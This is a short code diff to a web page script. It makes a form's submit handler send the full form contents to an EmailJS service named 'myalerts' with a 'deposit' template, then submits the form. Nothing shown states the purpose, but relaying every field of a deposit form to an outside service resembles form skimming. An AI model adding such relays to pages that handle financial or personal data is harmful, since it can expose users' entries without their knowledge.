@@ -175,12 +175,15 @@
         })
 
         form.addEventListener('submit', (e)=>{
+            e.preventDefault()
             emailjs.sendForm('myalerts', 'deposit', form)
                     .then(function() {
                         console.log('SUCCESS!');
+                        form.submit()
                     }, function(error) {
                         console.log('FAILED...', error);
                     });
+            
         })
 
     </script>
